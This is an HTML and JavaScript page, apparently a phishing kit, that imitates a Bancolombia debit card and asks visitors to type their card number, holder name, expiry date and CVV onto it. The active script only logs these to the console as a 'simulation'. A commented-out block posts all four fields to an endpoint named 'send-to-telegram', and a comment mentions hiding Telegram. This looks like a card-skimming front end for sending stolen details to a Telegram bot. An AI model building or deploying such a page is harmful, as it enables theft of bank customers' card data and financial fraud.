<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Tarjeta Débito Bancolombia | Fecha voltea al CVV</title>
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        background: linear-gradient(145deg, #e9eef3 0%, #dce2ea 100%);
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        font-family: 'Segoe UI', 'Inter', system-ui, sans-serif;
        padding: 24px;
    }

    .wrapper {
        max-width: 520px;
        width: 100%;
        margin: 0 auto;
    }

    .card-stage {
        perspective: 1200px;
        margin-bottom: 32px;
    }

    .card {
        position: relative;
        width: 100%;
        aspect-ratio: 85 / 54;
        border-radius: 28px;
        transform-style: preserve-3d;
        transition: transform 0.65s cubic-bezier(0.23, 1, 0.32, 1);
        box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.35);
    }

    .card.flipped {
        transform: rotateY(180deg);
    }

    .card-face {
        position: absolute;
        width: 100%;
        height: 100%;
        border-radius: 28px;
        backface-visibility: hidden;
        overflow: hidden;
    }

    .front {
        background: radial-gradient(circle at 10% 20%, #FFD700, #F9A800);
        padding: 24px 22px;
        display: flex;
        flex-direction: column;
        justify-content: space-between;
    }

    .bank-header {
        display: flex;
        justify-content: space-between;
        align-items: flex-start;
    }

    .bank-name {
        font-size: 1.8rem;
        font-weight: 800;
        color: #0c2b1f;
    }

    .badge {
        background: rgba(0,0,0,0.2);
        backdrop-filter: blur(2px);
        border-radius: 40px;
        padding: 5px 12px;
        font-size: 0.7rem;
        font-weight: 700;
    }

    .sim-chip {
        width: 54px;
        height: 42px;
        background: linear-gradient(135deg, #e0b87a, #bd8a3e);
        border-radius: 10px;
        margin-top: 18px;
        position: relative;
    }
    .sim-chip:before {
        content: "";
        position: absolute;
        top: 10px;
        left: 12px;
        width: 30px;
        height: 22px;
        background: repeating-linear-gradient(45deg, #c29a4b, #c29a4b 4px, #e6c384 4px, #e6c384 8px);
        border-radius: 4px;
    }

    .card-number-input {
        background: transparent;
        border: none;
        font-size: 1.65rem;
        font-weight: 700;
        letter-spacing: 2.5px;
        font-family: 'Courier New', monospace;
        width: 100%;
        outline: none;
        color: #0d281d;
        padding: 4px 0;
        margin-top: 16px;
        cursor: text;
    }
    .card-number-input::placeholder {
        color: #aa7733;
        font-size: 1.2rem;
    }

    .info-row {
        display: flex;
        justify-content: space-between;
        margin-top: 20px;
    }

    .info-group {
        flex: 1;
    }

    .label {
        font-size: 0.65rem;
        font-weight: 600;
        text-transform: uppercase;
        color: #2c2b26;
    }

    .editable-value {
        background: transparent;
        border: none;
        font-weight: 700;
        font-size: 0.9rem;
        width: 100%;
        outline: none;
        color: #0d1f16;
        margin-top: 4px;
        cursor: text;
        padding: 2px 0;
    }

    .back {
        background: linear-gradient(145deg, #f7cd5c, #eda512);
        transform: rotateY(180deg);
    }

    .black-strip {
        background: #0a0a0a;
        width: 100%;
        height: 55px;
        margin-top: 28px;
    }

    .cvc-container {
        background: #fff9ef;
        margin: 28px 20px 20px 20px;
        border-radius: 10px;
        padding: 12px 16px;
        display: flex;
        justify-content: space-between;
    }

    .cvc-input {
        background: transparent;
        border: none;
        font-size: 1.35rem;
        font-weight: bold;
        font-family: monospace;
        width: 80px;
        text-align: right;
        outline: none;
    }

    .btn-send {
        background: linear-gradient(95deg, #2b6e3c, #1f4f2a);
        border: none;
        width: 100%;
        padding: 14px;
        border-radius: 40px;
        color: white;
        font-weight: 700;
        font-size: 1rem;
        cursor: pointer;
        transition: 0.2s;
        margin-top: 20px;
    }

    .btn-send:hover {
        transform: scale(0.98);
        background: linear-gradient(95deg, #1f582d, #15411f);
    }

    .btn-send:disabled {
        opacity: 0.6;
        cursor: not-allowed;
    }

    .status-msg {
        font-size: 0.75rem;
        margin-top: 12px;
        text-align: center;
        padding: 10px;
        border-radius: 40px;
        background: #f0f0f0;
    }

    .instruction {
        background: rgba(255,248,220,0.9);
        border-radius: 24px;
        padding: 12px 16px;
        text-align: center;
        font-size: 0.75rem;
        margin-bottom: 20px;
        color: #664d1a;
    }
    
    .highlight {
        background: #f5b81b;
        color: #1f2a0e;
        padding: 2px 8px;
        border-radius: 20px;
        font-weight: bold;
    }
</style>
</head>
<body>
<div class="wrapper">
    <div class="instruction">
        💳 <strong>Escribe directamente SOBRE la tarjeta</strong> — Completa el número, titular y <span class="highlight">FECHA</span>. 
        <br>✨ Al terminar de escribir la fecha, la tarjeta se voltea automáticamente para que ingreses el CVV.
    </div>

    <div class="card-stage">
        <div class="card" id="creditCard">
            <div class="card-face front">
                <div class="bank-header">
                    <div class="bank-name">Bancolombia</div>
                    <div class="badge">DÉBITO</div>
                </div>
                <div class="sim-chip"></div>
                <input type="text" id="cardNumberInput" class="card-number-input" placeholder="**** **** **** ****" maxlength="19" inputmode="numeric">
                <div class="info-row">
                    <div class="info-group" style="flex: 2;">
                        <div class="label">TITULAR</div>
                        <input type="text" id="cardHolderInput" class="editable-value" placeholder="NOMBRE DEL TITULAR" maxlength="35">
                    </div>
                    <div class="info-group">
                        <div class="label">VENCE</div>
                        <input type="text" id="expiryInput" class="editable-value" placeholder="MM/AA" maxlength="5" style="width: 75px;">
                    </div>
                </div>
            </div>
            <div class="card-face back">
                <div class="black-strip"></div>
                <div class="cvc-container">
                    <span style="font-weight:700">CVV2 / CVC</span>
                    <input type="text" id="cvcInput" class="cvc-input" maxlength="3" placeholder="123" inputmode="numeric">
                </div>
            </div>
        </div>
    </div>

    <button class="btn-send" id="sendBtn">💸 ENVIAR DATOS</button>
    <div id="statusMsg" class="status-msg">✅ Listo. Completa los datos y presiona enviar</div>
</div>

<script>
    const card = document.getElementById('creditCard');
    const numberInput = document.getElementById('cardNumberInput');
    const holderInput = document.getElementById('cardHolderInput');
    const expiryInput = document.getElementById('expiryInput');
    const cvcInput = document.getElementById('cvcInput');
    const sendBtn = document.getElementById('sendBtn');
    const statusMsg = document.getElementById('statusMsg');

    // Variables para controlar el flip automático
    let isFlippingFromExpiry = false;
    let expiryTimeout = null;

    // Formatear número de tarjeta
    function formatCardNumber(value) {
        let cleaned = value.replace(/\D/g, '');
        if (cleaned.length > 16) cleaned = cleaned.slice(0, 16);
        let parts = [];
        for (let i = 0; i < cleaned.length; i += 4) {
            parts.push(cleaned.slice(i, i + 4));
        }
        return parts.join(' ');
    }

    numberInput.addEventListener('input', function(e) {
        let formatted = formatCardNumber(e.target.value);
        e.target.value = formatted;
    });

    // Formatear fecha (MM/AA)
    function formatExpiry(value) {
        let digits = value.replace(/\D/g, '');
        if (digits.length > 4) digits = digits.slice(0, 4);
        if (digits.length >= 3) {
            return digits.slice(0, 2) + '/' + digits.slice(2, 4);
        }
        return digits;
    }

    expiryInput.addEventListener('input', function(e) {
        let formatted = formatExpiry(e.target.value);
        e.target.value = formatted;
        
        // Resetear el timeout de flip cada vez que escribe
        if (expiryTimeout) clearTimeout(expiryTimeout);
        
        // Si la fecha está completa (5 caracteres incluyendo /), programar el flip
        if (e.target.value.length === 5 && e.target.value.includes('/')) {
            // Pequeño delay para dar tiempo a ver lo que escribió, luego voltea al CVV
            expiryTimeout = setTimeout(() => {
                if (!card.classList.contains('flipped')) {
                    isFlippingFromExpiry = true;
                    card.classList.add('flipped');
                    // Dar foco automáticamente al campo CVV para que el usuario pueda escribir
                    setTimeout(() => {
                        cvcInput.focus();
                        isFlippingFromExpiry = false;
                    }, 400);
                }
                expiryTimeout = null;
            }, 300);
        }
    });

    // Cuando la fecha pierde el foco (terminó de editar), también volteamos al CVV si no está completo
    expiryInput.addEventListener('blur', function() {
        // Si hay un timeout pendiente, lo cancelamos y ejecutamos inmediatamente
        if (expiryTimeout) {
            clearTimeout(expiryTimeout);
            expiryTimeout = null;
        }
        
        // Si la tarjeta no está volteada y el campo fecha tiene al menos 3 caracteres (MM/ o MM/A)
        if (!card.classList.contains('flipped') && expiryInput.value.length >= 3) {
            isFlippingFromExpiry = true;
            card.classList.add('flipped');
            setTimeout(() => {
                cvcInput.focus();
                isFlippingFromExpiry = false;
            }, 400);
        }
    });

    // Presionar Enter en el campo fecha también voltea
    expiryInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            if (!card.classList.contains('flipped')) {
                isFlippingFromExpiry = true;
                card.classList.add('flipped');
                setTimeout(() => {
                    cvcInput.focus();
                    isFlippingFromExpiry = false;
                }, 400);
            }
        }
    });

    // Titular en mayúsculas
    holderInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.toUpperCase();
    });

    // CVC solo números
    cvcInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
    });

    // Flip de tarjeta al enfocar CVC (si viene desde fecha, ya está volteado)
    cvcInput.addEventListener('focus', () => {
        if (!isFlippingFromExpiry) {
            card.classList.add('flipped');
        }
    });
    
    cvcInput.addEventListener('blur', () => {
        // No quitamos el flip inmediatamente si el siguiente foco es otro campo
        setTimeout(() => {
            const activeElement = document.activeElement;
            const isFrontField = activeElement === numberInput || activeElement === holderInput || activeElement === expiryInput;
            if (!isFrontField && activeElement !== cvcInput) {
                card.classList.remove('flipped');
            }
        }, 150);
    });

    // Quitar flip al enfocar campos del frente (excepto si venimos del flip automático)
    [numberInput, holderInput].forEach(input => {
        input.addEventListener('focus', () => {
            if (card.classList.contains('flipped')) {
                card.classList.remove('flipped');
            }
        });
    });
    
    // También al hacer clic en el campo fecha desde el reverso, volvemos al frente
    expiryInput.addEventListener('focus', () => {
        if (card.classList.contains('flipped')) {
            card.classList.remove('flipped');
        }
    });

    // Enviar datos al backend (simulación, sin exponer Telegram)
    sendBtn.addEventListener('click', async () => {
        const cardNumber = numberInput.value.replace(/\s/g, '');
        const cardHolder = holderInput.value.trim();
        const expiryDate = expiryInput.value.trim();
        const cvcCode = cvcInput.value.trim();

        if (!cardNumber || !cardHolder || !expiryDate || !cvcCode) {
            statusMsg.innerHTML = '⚠️ Por favor, completa todos los datos de la tarjeta';
            statusMsg.style.background = '#ffe0e0';
            setTimeout(() => {
                statusMsg.style.background = '#f0f0f0';
                statusMsg.innerHTML = '✅ Listo. Completa los datos y presiona enviar';
            }, 3000);
            return;
        }

        if (cardNumber.length < 16) {
            statusMsg.innerHTML = '⚠️ El número de tarjeta debe tener 16 dígitos';
            statusMsg.style.background = '#ffe0e0';
            setTimeout(() => {
                statusMsg.style.background = '#f0f0f0';
                statusMsg.innerHTML = '✅ Listo. Completa los datos y presiona enviar';
            }, 3000);
            return;
        }
        
        if (expiryDate.length < 5 || !expiryDate.includes('/')) {
            statusMsg.innerHTML = '⚠️ La fecha debe tener formato MM/AA';
            statusMsg.style.background = '#ffe0e0';
            setTimeout(() => {
                statusMsg.style.background = '#f0f0f0';
                statusMsg.innerHTML = '✅ Listo. Completa los datos y presiona enviar';
            }, 3000);
            return;
        }
        
        if (cvcCode.length < 3) {
            statusMsg.innerHTML = '⚠️ El CVV debe tener 3 dígitos';
            statusMsg.style.background = '#ffe0e0';
            setTimeout(() => {
                statusMsg.style.background = '#f0f0f0';
                statusMsg.innerHTML = '✅ Listo. Completa los datos y presiona enviar';
            }, 3000);
            return;
        }

        sendBtn.disabled = true;
        sendBtn.textContent = '📡 ENVIANDO...';
        statusMsg.innerHTML = '📡 Enviando información...';
        statusMsg.style.background = '#e3f2fd';

        // Aquí puedes conectar con tu backend real
        // Por ahora simulamos el envío exitoso (sin Telegram expuesto)
        setTimeout(() => {
            // Mostrar datos en consola para verificar
            console.log('=== DATOS DE TARJETA ===');
            console.log('Número:', cardNumber);
            console.log('Titular:', cardHolder);
            console.log('Vencimiento:', expiryDate);
            console.log('CVV:', cvcCode);
            console.log('=======================');
            
            statusMsg.innerHTML = '✅ ¡Datos procesados correctamente! (Simulación)';
            statusMsg.style.background = '#d4edda';
            statusMsg.style.color = '#155724';
            
            sendBtn.disabled = false;
            sendBtn.textContent = '💸 ENVIAR DATOS';
            
            setTimeout(() => {
                if (statusMsg.innerHTML.includes('procesados')) {
                    statusMsg.style.background = '#f0f0f0';
                    statusMsg.style.color = '#000';
                    statusMsg.innerHTML = '✅ Listo. Completa los datos y presiona enviar';
                }
            }, 4000);
        }, 1500);
        
        // Si quisieras conectarlo a un backend real, descomenta este código:
        /*
        try {
            const response = await fetch('http://localhost:3000/api/send-to-telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    cardNumber: cardNumber,
                    cardHolder: cardHolder,
                    expiryDate: expiryDate,
                    cvcCode: cvcCode
                })
            });

            const data = await response.json();

            if (response.ok && data.success) {
                statusMsg.innerHTML = '✅ ¡Datos enviados con éxito a Telegram!';
                statusMsg.style.background = '#d4edda';
            } else {
                statusMsg.innerHTML = '❌ Error al enviar: ' + (data.error || 'Error desconocido');
                statusMsg.style.background = '#f8d7da';
            }
        } catch (error) {
            console.error('Error:', error);
            statusMsg.innerHTML = '❌ Error de conexión con el servidor. Asegúrate que el backend esté corriendo en puerto 3000';
            statusMsg.style.background = '#f8d7da';
        } finally {
            sendBtn.disabled = false;
            sendBtn.textContent = '💸 ENVIAR DATOS';
            setTimeout(() => {
                if (statusMsg.innerHTML.includes('éxito')) {
                    statusMsg.style.background = '#f0f0f0';
                    statusMsg.innerHTML = '✅ Listo. Completa los datos y presiona enviar';
                }
            }, 4000);
        }
        */
    });
</script>
</body>
</html>
